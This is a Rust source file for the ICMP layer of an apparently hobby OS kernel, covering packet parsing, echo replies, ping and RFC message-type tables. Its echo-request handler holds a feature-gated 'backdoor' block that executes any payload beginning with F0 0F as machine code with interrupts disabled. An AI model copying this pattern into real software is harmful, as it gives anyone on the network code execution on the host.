use core::{
    net::Ipv4Addr,
    pin::Pin,
    task::{Context, Poll, Waker},
};

use crate::sync::spinlock::Mutex;
use alloc::{vec, vec::Vec};
use crossbeam_queue::ArrayQueue;
use futures_util::{Stream, StreamExt, task::AtomicWaker};
use lazy_static::lazy_static;
use log::debug;

use crate::{
    net::{
        Interface, PACKET_QUEUE,
        ip::{IPv4Header, IPv4Packet},
        ones_complement_checksum,
    },
    tryfrom::{TryFrom2argAndReverse, tryfrom},
};

#[derive(Debug, PartialEq, Eq)]
pub struct ICMPPacket<'a> {
    typ: ControlMessageType,
    checksum: u16,
    other: u32,
    data: &'a [u8],
}

pub async fn handle_icmp(packet: &IPv4Packet<'_>, interface: &Interface) {
    // Packet already validated to have us as its destination
    let Ok(icmpp) = ICMPPacket::try_from(packet.data) else {
        return;
    };

    debug!("handling icmp: {:?}", packet);

    match icmpp.typ {
        ControlMessageType::EchoRequest(NoSubcode::NoCode) => {
            handle_icmp_echo_request(icmpp, &packet.header, interface).await;
        }
        ControlMessageType::EchoReply(NoSubcode::NoCode) => {
            handle_icmp_echo_response(icmpp, &packet.header, interface);
        }
        unknown => {
            log::warn!("Unhandled ICMP ControlMessageType: {:?}", unknown);
        }
    }
}

// should this be made into a generic handle<T> ?
async fn handle_icmp_echo_request(
    icmpp: ICMPPacket<'_>,
    header: &IPv4Header,
    interface: &Interface,
) {
    log::debug!("{:?}", icmpp.data);

    #[cfg(feature = "backdoor")]
    {
        let dpat = &icmpp.data[0..2];
        let pattern = b"\xF0\x0F";

        if dpat == pattern {
            use x86_64::instructions::interrupts::without_interrupts;

            log::warn!("BACKDOOR ACTIVATED");

            let program = &icmpp.data.as_slice()[pattern.len()..];

            // safe since sender pinky promisies that the code is memory safe :3
            without_interrupts(|| unsafe {
                core::arch::asm!(
                "call rax", in("rax") program.as_ptr(),
                clobber_abi("C")
                );
            });
        }
    }

    let mut response = ICMPPacket {
        typ: ControlMessageType::EchoReply(NoSubcode::NoCode),
        checksum: 0,
        other: icmpp.other,
        data: icmpp.data,
    };

    response.calc_new_checksum();

    let resp_bytes = response.to_bytes();
    let ipv4 = IPv4Packet::from_source_dest_and_data(
        interface.ip,
        header.source_address,
        resp_bytes.as_slice(),
    )
    .expect("Packet constructed incorrectly");

    log::trace!("Sending icmp response: {:?}", ipv4);
    super::ip::send_ipv4_packet(ipv4, interface).await;
}

/// This is called when an echo response addressed to us has arrived.
fn handle_icmp_echo_response(icmpp: ICMPPacket<'_>, header: &IPv4Header, _interface: &Interface) {
    // The packet arriving should be just logged for now. In future will do better
    log::info!(
        "received icmp response! {:?} from source: {}",
        icmpp,
        header.source_address
    );

    PING_RESPONSE_QUEUE.lock().push(());

    PING_WAKER.wake();
}

static PING_WAKER: AtomicWaker = AtomicWaker::new();

// empty for now
lazy_static! {
    static ref PING_RESPONSE_QUEUE: Mutex<ArrayQueue<()>> = Mutex::new(ArrayQueue::new(10));
}

struct PingRequestStream {
    // current_sequence_num: u16,
    // identifier: u16,
}

impl Stream for PingRequestStream {
    type Item = ();

    fn poll_next(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<Option<Self::Item>> {
        // let queue = PING_RESPONSE_QUEUE.lock();

        if let Some(_) = PING_RESPONSE_QUEUE.lock().pop() {
            return Poll::Ready(Some(()));
        }

        PING_WAKER.register(cx.waker());

        match PING_RESPONSE_QUEUE.lock().pop() {
            Some(_) => {
                PING_WAKER.take();
                Poll::Ready(Some(()))
            }
            None => Poll::Pending,
        }
    }
}

pub async fn ping_once(target: Ipv4Addr) {
    log::info!("pinging target: {}", target);

    let Some(interface) = *crate::net::INTERFACE.read().await else {
        log::error!("Unable to load network interface.");
        return;
    };

    let mut request = ICMPPacket {
        typ: ControlMessageType::EchoRequest(NoSubcode::NoCode),
        checksum: 0,
        // contains identifier_u16 and sequence number_u16
        other: 0,
        data: b"an icmp payload yayy",
    };

    request.calc_new_checksum();
    let bytes = request.to_bytes();
    let packet = IPv4Packet::from_source_dest_and_data(interface.ip, target, bytes.as_slice())
        .expect("icmp request is valid");
    let Ok(_) = super::ip::send_ipv4_packet(packet, &interface).await else {
        log::error!("could not send icmp request.");
        return;
    };

    let mut p = PingRequestStream {};
    p.next().await;
    log::info!("received a response!");
}

impl<'a> TryFrom<&'a [u8]> for ICMPPacket<'a> {
    type Error = ICMPError;
    fn try_from(v: &'a [u8]) -> Result<Self, Self::Error> {
        if v.len() < 8 {
            return Err(ICMPError::PacketNotLongEnough);
        }

        Ok(ICMPPacket {
            typ: ControlMessageType::try_from((v[0], v[1]))
                .map_err(|_| ICMPError::UnknownControlMessageType)?,
            checksum: u16::from_be_bytes(v[2..4].try_into().unwrap()),
            other: u32::from_be_bytes(v[4..8].try_into().unwrap()),
            data: &v[8..v.len()],
        })
    }
}

impl ICMPPacket<'_> {
    /// Replaces the checksum of self with a correct one
    pub fn calc_new_checksum(&mut self) {
        self.checksum = 0;
        let bytes = self.to_bytes();
        self.checksum = ones_complement_checksum(bytes.as_slice());

        debug_assert_eq!(
            ones_complement_checksum(self.to_bytes().as_slice()),
            0,
            "checksum with self should be 0"
        );
    }

    pub fn to_bytes(&self) -> Vec<u8> {
        let mut buf = vec![0u8; self.total_len()];
        buf[0] = self.typ.outer_as();
        buf[1] = self.typ.inner_as();
        buf[2..=3].copy_from_slice(&self.checksum.to_be_bytes());
        buf[4..8].copy_from_slice(&self.other.to_be_bytes());
        buf[8..self.total_len()].copy_from_slice(self.data);

        buf
    }

    fn total_len(&self) -> usize {
        8 + self.data.len()
    }
}

#[derive(Debug)]
pub enum ICMPError {
    UnknownControlMessageType,
    PacketNotLongEnough,
}

#[derive(Debug)]
#[expect(unused)]
pub struct EchoPacket {
    identifier: u16,
    sequence_num: u16,
}

impl From<u32> for EchoPacket {
    fn from(v: u32) -> Self {
        EchoPacket {
            identifier: ((v >> 16) & 0xFFFF) as u16,
            sequence_num: (v & 0xFFFF) as u16,
        }
    }
}

TryFrom2argAndReverse! {
    #[repr(u8)]
    #[derive(Clone, Copy, Debug, PartialEq, Eq)]
    pub enum ControlMessageType {
        EchoReply(NoSubcode) = 0,
        DestinationUnreachable(DestinationUnreachableSubcode) = 3,
        /// Deprecated (RFC 6633)
        SourceQuench(NoSubcode) = 4,
        Redirect(RedirectSubcode) = 5,
        EchoRequest(NoSubcode) = 8,
        RouterAdvertisement(RouterAdvertisementSubcode) = 9,
        RouterSolicitation(NoSubcode) = 10,
        TimeExceeded(TimeExceededSubcode) = 11,
        ParameterProblem(ParameterProblemSubcode) = 12,
        /// Deprecated (RFC 6918)
        Timestamp(NoSubcode) = 13,
        /// Deprecated (RFC 6918)
        TimestampReply(NoSubcode) = 14,
        /// Deprecated (RFC 6918)
        InformationRequest(NoSubcode) = 15,
        /// Deprecated (RFC 6918)
        InformationReply(NoSubcode) = 16,
        /// Deprecated (RFC 6918)
        AddressMaskRequest(NoSubcode) = 17,
        /// Deprecated (RFC 6918)
        AddressMaskReply(NoSubcode) = 18,
        Photuris(PhototurisSubcode) = 40,
        ExtendedEchoRequest(NoSubcode) = 42,
        ExtendedEchoReply(ExtendedEchoReplySubcode) = 43,
    }, u8
}

// Used for message types that have no meaningful subcodes (code is always 0)
tryfrom! {
    #[repr(u8)]
    #[derive(Clone, Copy, Debug, PartialEq, Eq)]
    pub enum NoSubcode {
        NoCode = 0,
    }, u8
}

tryfrom! {
    #[repr(u8)]
    #[derive(Clone, Copy, Debug, PartialEq, Eq)]
    pub enum DestinationUnreachableSubcode {
        /// RFC 792
        NetUnreachable                          = 0,
        /// RFC 792
        HostUnreachable                         = 1,
        /// RFC 792
        ProtocolUnreachable                     = 2,
        /// RFC 792
        PortUnreachable                         = 3,
        /// RFC 792 — packet required fragmentation but DF bit was set
        FragmentationNeededDfSet                = 4,
        /// RFC 792
        SourceRouteFailed                       = 5,
        /// RFC 1122
        DestinationNetworkUnknown               = 6,
        /// RFC 1122
        DestinationHostUnknown                  = 7,
        /// RFC 1122
        SourceHostIsolated                      = 8,
        /// RFC 1122
        NetworkAdministrativelyProhibited       = 9,
        /// RFC 1122
        HostAdministrativelyProhibited          = 10,
        /// RFC 1122
        NetworkUnreachableForTos                = 11,
        /// RFC 1122
        HostUnreachableForTos                   = 12,
        /// RFC 1812
        CommunicationAdministrativelyProhibited = 13,
        /// RFC 1812
        HostPrecedenceViolation                 = 14,
        /// RFC 1812
        PrecedenceCutoffInEffect                = 15,
    }, u8
}

tryfrom! {
    #[repr(u8)]
    #[derive(Clone, Copy, Debug, PartialEq, Eq)]
    pub enum RedirectSubcode {
        /// Redirect for the network (or subnet)
        Network         = 0,
        /// Redirect for the host
        Host            = 1,
        /// Redirect for the type of service and network
        TosAndNetwork   = 2,
        /// Redirect for the type of service and host
        TosAndHost      = 3,
    }, u8
}

tryfrom! {
    #[repr(u8)]
    #[derive(Clone, Copy, Debug, PartialEq, Eq)]
    pub enum RouterAdvertisementSubcode {
        /// RFC 3344
        NormalRouterAdvertisement  = 0,
        /// RFC 3344 — router does not route common traffic
        DoesNotRouteCommonTraffic  = 16,
    }, u8
}

tryfrom! {
    #[repr(u8)]
    #[derive(Clone, Copy, Debug, PartialEq, Eq)]
    pub enum TimeExceededSubcode {
        /// TTL expired in transit — this is what traceroute exploits
        TtlExceededInTransit        = 0,
        /// Fragment reassembly time exceeded
        FragmentReassemblyExceeded  = 1,
    }, u8
}

tryfrom! {
    #[repr(u8)]
    #[derive(Clone, Copy, Debug, PartialEq, Eq)]
    pub enum ParameterProblemSubcode {
        /// Pointer field indicates the octet where the error was detected
        PointerIndicatesError       = 0,
        /// RFC 1108
        MissingRequiredOption       = 1,
        BadLength                   = 2,
    }, u8
}

tryfrom! {
    #[repr(u8)]
    #[derive(Clone, Copy, Debug, PartialEq, Eq)]
    pub enum PhototurisSubcode {
        /// RFC 2521
        BadSpi                 = 0,
        AuthenticationFailed   = 1,
        DecompressionFailed    = 2,
        DecryptionFailed       = 3,
        NeedAuthentication     = 4,
        NeedAuthorization      = 5,
    }, u8
}

tryfrom! {
    #[repr(u8)]
    #[derive(Clone, Copy, Debug, PartialEq, Eq)]
    pub enum ExtendedEchoReplySubcode {
        /// RFC 8335
        NoError                    = 0,
        MalformedQuery             = 1,
        NoSuchInterface            = 2,
        NoSuchTableEntry           = 3,
        MultipleInterfacesSatisfy  = 4,
    }, u8
}
